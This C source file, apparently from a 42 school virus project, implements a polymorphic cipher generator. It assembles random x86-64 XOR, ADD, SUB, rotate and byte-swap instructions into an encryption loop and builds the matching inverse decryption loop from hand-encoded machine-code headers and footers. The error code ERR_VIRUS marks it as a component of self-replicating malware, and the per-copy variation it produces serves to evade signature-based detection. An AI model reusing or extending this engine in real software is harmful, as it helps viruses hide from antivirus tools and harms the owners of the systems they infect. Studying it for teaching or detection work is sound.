/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   generate_cypher.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 20:54:46 by anselme           #+#    #+#             */
/*   Updated: 2019/12/26 23:51:52 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

# include <stdbool.h>
# include <stdint.h>
# include <stddef.h>

#include "accessors.h"
#include "utils.h"
#include "errors.h"
#include "position_independent.h"

#define CYPHER		0
#define DECYPHER	1

#define IMM_IB		1
#define IMM_IW		2
#define IMM_ID		4
#define IMM_IO		8

#define ENCODE_VALUE(value, mask, shift_bit)	((value & mask) << shift_bit)

enum
{
	I_BASE,
	XOR_RM64_IMM8,		// REX.W + 83 /6 ib XOR r/m64, imm8
	ADD_RM64_IMM8,		// REX.W + 83 /0 ib ADD r/m64, imm8
	SUB_RM64_IMM8,		// REX.W + 83 /5 ib SUB r/m64, imm8

	XOR_RAX_IMM32,		// REX.W + 35 id XOR RAX, imm32
	ADD_RAX_IMM32,		// REX.W + 05 id ADD RAX, imm32
	SUB_RAX_IMM32,		// REX.W + 2D id SUB RAX, imm32

	ROR_RM64_IMM8,		// REX.W + C1 /1 ib
	ROL_RM64_IMM8,		// REX.W + C1 /0 ib
	BSWAP_R64,		// REX.W + 0F C8+rd, +0 for rax
	I_SIZE
};

struct	x86_64_encode
{
	uint8_t		size:8;
	uint8_t		prefix_rex:4;
	uint8_t		prefix_rex_w:1;
	uint8_t		prefix_rex_r:1;
	uint8_t		prefix_rex_x:1;
	uint8_t		prefix_rex_b:1;
	uint8_t		opcode_escape:8;
	uint8_t		opcode_two:8;
	uint8_t		opcode_one:8;
	uint8_t		mod:2;
	uint8_t		reg:3;
	uint8_t		rm:3;
	uint8_t		scale:2;
	uint8_t		index:3;
	uint8_t		base:3;
	uint32_t	displacement:32;
	uint32_t	immediate:32;
}__attribute__((packed));

static void		encode_instruction(uint8_t *buffer,
				struct x86_64_encode i, uint64_t *seed)
{
	uint64_t	immediate = random_inrange(seed, 0x1, 0x7fffffff);
	uint8_t		operand_size = i.immediate;

	if (operand_size == IMM_IB) immediate &= 0x7f;
	else if (operand_size == IMM_IW) immediate &= 0x7fff;
	else if (operand_size == IMM_ID) immediate &= 0x7fffffff;
	else if (operand_size == IMM_IO) immediate &= 0x7fffffffffffffff;
	else immediate &= 0x7fffffffffffffff;

	/* REX prefix */
	*buffer |= ENCODE_VALUE(i.prefix_rex, 0x07, 0x04);
	*buffer |= ENCODE_VALUE(i.prefix_rex_w, 0x01, 0x03);
	*buffer |= ENCODE_VALUE(i.prefix_rex_r, 0x01, 0x02);
	*buffer |= ENCODE_VALUE(i.prefix_rex_x, 0x01, 0x01);
	*buffer |= ENCODE_VALUE(i.prefix_rex_b, 0x01, 0x00);
	if (*buffer) buffer++;
	/* Opcode */
	*buffer |= ENCODE_VALUE(i.opcode_escape, 0xff, 0x00);
	if (*buffer) buffer++;
	*buffer |= ENCODE_VALUE(i.opcode_two, 0xff, 0x00);
	if (*buffer) buffer++;
	*buffer |= ENCODE_VALUE(i.opcode_one, 0xff, 0x00);
	if (*buffer) buffer++;
	/* MOD/RM */
	*buffer |= ENCODE_VALUE(i.mod, 0x03, 0x06);
	*buffer |= ENCODE_VALUE(i.reg, 0x07, 0x03);
	*buffer |= ENCODE_VALUE(i.rm, 0x07, 0x00);
	if (*buffer) buffer++;
	/* SIB */
	*buffer |= ENCODE_VALUE(i.scale, 0x03, 0x06);
	*buffer |= ENCODE_VALUE(i.index, 0x07, 0x03);
	*buffer |= ENCODE_VALUE(i.base, 0x07, 0x00);
	if (*buffer) buffer++;
	/* Displacement */
	if (i.displacement)
		memcpy(buffer, &immediate, i.immediate);
	if (*buffer) buffer += operand_size;
	/* Immediate */
	if (i.immediate)
		memcpy(buffer, &immediate, i.immediate);
	// if (*buffer) buffer += operand_size;
}

static struct x86_64_encode	select_instruction(uint64_t *seed, int8_t operation)
{
	struct x86_64_encode	instructions[I_SIZE];
	instructions[XOR_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,   0,0x83, 0b11,0b110,0b000, 0,0,0, 0,IMM_IB};
	instructions[ADD_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,   0,0x83, 0b11,0b000,0b000, 0,0,0, 0,IMM_IB};
	instructions[SUB_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,   0,0x83, 0b11,0b101,0b000, 0,0,0, 0,IMM_IB};
	instructions[XOR_RAX_IMM32] = (struct x86_64_encode){6, 0b0100,0b1,0,0,0, 0,   0,0x35,    0,    0,    0, 0,0,0, 0,IMM_ID};
	instructions[ADD_RAX_IMM32] = (struct x86_64_encode){6, 0b0100,0b1,0,0,0, 0,   0,0x05,    0,    0,    0, 0,0,0, 0,IMM_ID};
	instructions[SUB_RAX_IMM32] = (struct x86_64_encode){6, 0b0100,0b1,0,0,0, 0,   0,0x2d,    0,    0,    0, 0,0,0, 0,IMM_ID};
	instructions[ROR_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,   0,0xc1, 0b11,0b001,0b000, 0,0,0, 0,IMM_IB};
	instructions[ROL_RM64_IMM8] = (struct x86_64_encode){4, 0b0100,0b1,0,0,0, 0,   0,0xc1, 0b11,0b000,0b000, 0,0,0, 0,IMM_IB};
	instructions[BSWAP_R64]     = (struct x86_64_encode){3, 0b0100,0b1,0,0,0, 0,0x0f,0xc8,    0,    0,    0, 0,0,0, 0,     0};

	int			instructions_match[I_SIZE];
	instructions_match[XOR_RM64_IMM8] = XOR_RM64_IMM8;
	instructions_match[ADD_RM64_IMM8] = SUB_RM64_IMM8;
	instructions_match[SUB_RM64_IMM8] = ADD_RM64_IMM8;
	instructions_match[XOR_RAX_IMM32] = XOR_RAX_IMM32;
	instructions_match[ADD_RAX_IMM32] = SUB_RAX_IMM32;
	instructions_match[SUB_RAX_IMM32] = ADD_RAX_IMM32;
	instructions_match[ROR_RM64_IMM8] = ROL_RM64_IMM8;
	instructions_match[ROL_RM64_IMM8] = ROR_RM64_IMM8;
	instructions_match[BSWAP_R64]     = BSWAP_R64;

	uint64_t	instruction = random_exrange(seed, I_BASE, I_SIZE);

	if (operation == CYPHER)
		return instructions[instruction];
	else
		return instructions[instructions_match[instruction]];
}

static void	generate_shuffler(char *buffer, uint64_t seed, size_t size)
{
	struct x86_64_encode	i;

	bzero(buffer, size);

	while (size)
	{
		i = select_instruction(&seed, CYPHER);
		if (i.size > size)
		{
			memset(buffer, 0x90, size);
			break;
		}
		encode_instruction((uint8_t*)buffer, i, &seed);
		buffer += i.size;
		size -= i.size;
	}
}

static void	generate_unshuffler(char *buffer, uint64_t seed, size_t size)
{
	struct x86_64_encode	i;

	bzero(buffer, size);
	buffer += size;

	while (size)
	{
		i = select_instruction(&seed, DECYPHER);
		if (i.size > size)
		{
			buffer -= size;
			memset(buffer, 0x90, size);
			break;
		}
		buffer -= i.size;
		encode_instruction((uint8_t*)buffer, i, &seed);
		size -= i.size;
	}
}

/*
** generate_loop_frame:
**   - writes a header at the beginning of the buffer
**   - writes a footer at the end of the buffer
**   - returns a safe pointer to the middle of the buffer
**   - returns a NULL safe pointer in case size is too small
*/
static struct safe_ptr    generate_loop_frame(char *buffer, size_t size)
{
	PD_ARRAY(uint8_t, header,
		0x48, 0xc1, 0xee, 0x03,             /*     shr rsi, 0x3       */
		0x48, 0xc1, 0xe6, 0x03,             /*     shl rsi, 0x3       */
		0x48, 0x85, 0xf6,                   /* cypher: test rsi, rsi  */
		0x0f, 0x84, 0x14, 0x00, 0x00, 0x00, /*     jz cypher_end      */
		0x48, 0x8b, 0x07                    /*     mov rax, [rdi]     */
	);

	PD_ARRAY(uint8_t, footer,
		0x48, 0x89, 0x07,                   /*     mov [rdi], rax     */
		0x48, 0x83, 0xc7, 0x08,             /*     add rdi, 0x8       */
		0x48, 0x83, 0xee, 0x08,             /*     sub rsi, 0x8       */
		0xe9, 0xe4, 0xff, 0xff, 0xff,       /*     jmp cypher         */
		0xc3                                /* cypher_end: ret        */
	);

	if (size < sizeof(footer) + sizeof(header))
		return (struct safe_ptr){NULL, 0};

	char	*remaining_buffer = buffer + sizeof(header);
	size_t	remaining_size    = size - sizeof(footer) - sizeof(header);

	int16_t *rel_cypher_end = (int16_t *)&header[13];
	int16_t *rel_cypher     = (int16_t *)&footer[12];

	// check for overflows and underflows
	if (*rel_cypher_end + (uint16_t)remaining_size < *rel_cypher_end
	|| *rel_cypher - (uint16_t)remaining_size > *rel_cypher)
		return (struct safe_ptr){NULL, 0};

	*rel_cypher_end += (uint16_t)remaining_size;
	*rel_cypher     -= (uint16_t)remaining_size;

	memcpy(buffer, header, sizeof(header));
	memcpy(buffer + size - sizeof(footer), footer, sizeof(footer));

	return (struct safe_ptr){remaining_buffer, remaining_size};
}

bool		generate_cypher(char *buffer, uint64_t seed, size_t size)
{
	struct safe_ptr	frame;

	frame = generate_loop_frame(buffer, size);
	if (frame.ptr == NULL) return errors(ERR_VIRUS, _ERR_GEN_LOOP_FRAME);

	generate_shuffler(frame.ptr, seed, frame.size);
	return true;
}

bool		generate_decypher(char *buffer, uint64_t seed, size_t size)
{
	struct safe_ptr	frame;

	frame = generate_loop_frame(buffer, size);
	if (frame.ptr == NULL) return errors(ERR_VIRUS, _ERR_GEN_LOOP_FRAME);

	generate_unshuffler(frame.ptr, seed, frame.size);
	return true;
}
